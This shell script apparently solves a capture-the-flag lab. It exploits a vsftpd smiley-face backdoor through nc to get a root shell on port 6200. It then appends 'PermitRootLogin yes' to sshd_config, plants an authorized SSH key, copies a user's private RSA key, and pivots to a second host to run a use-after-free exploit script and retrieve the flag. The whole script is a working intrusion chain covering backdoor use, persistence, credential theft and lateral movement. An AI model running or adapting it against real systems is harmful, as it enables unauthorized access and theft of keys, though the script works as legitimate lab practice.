#!/bin/sh

# clean
rm -f /root/.ssh/id_ed25519
rm -f /root/.ssh/id_ed25519.pub
rm -f nc_pipe
pkill nc
pkill tail

# start backdoor shell on port 6200 on ftp machine
mkfifo nc_pipe
tail -f nc_pipe | nc 10.42.2.1 21 &
echo "USER x:)" > nc_pipe
echo "PASS any" > nc_pipe
rm -f nc_pipe
pkill nc
pkill tail

# set ssh access to ftp machine using backdoor
echo "ssh-keygen"
ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -q -N ""
mkfifo nc_pipe
tail -f nc_pipe | nc 10.42.2.1 6200 &
CMD="echo PermitRootLogin yes >> /etc/ssh/sshd_config"
CMD="${CMD} && mkdir -p /root/.ssh"
CMD="${CMD} && echo $(cat /root/.ssh/id_ed25519.pub) > /root/.ssh/authorized_keys"
CMD="${CMD} && kill -SIGHUP \$(ps -eaf | grep sshd | head -1 | awk '{print \$1}')"
echo $CMD > nc_pipe
rm -f nc_pipe
pkill nc
pkill tail
sleep 1

# give root on ftp machine access to ouioui account on private machine
ssh -o StrictHostKeyChecking=no root@10.42.2.1 "cp /home/ouioui/.ssh/id_rsa /root/.ssh"

# move uaf script to ftp machine
scp -o StrictHostKeyChecking=no soluce.py root@10.42.2.1:/root

CMD="scp -o StrictHostKeyChecking=no /root/soluce.py ouioui@10.42.3.1:/home/ouioui"
CMD="${CMD} && ssh -o StrictHostKeyChecking=no ouioui@10.42.3.1 'python3 /home/ouioui/soluce.py'"
CMD="${CMD} && scp -o StrictHostKeyChecking=no ouioui@10.42.3.1:/home/ouioui/flag.txt /root"
ssh -o StrictHostKeyChecking=no root@10.42.2.1 "${CMD}"

scp -o StrictHostKeyChecking=no root@10.42.2.1:/root/flag.txt .

cat flag.txt

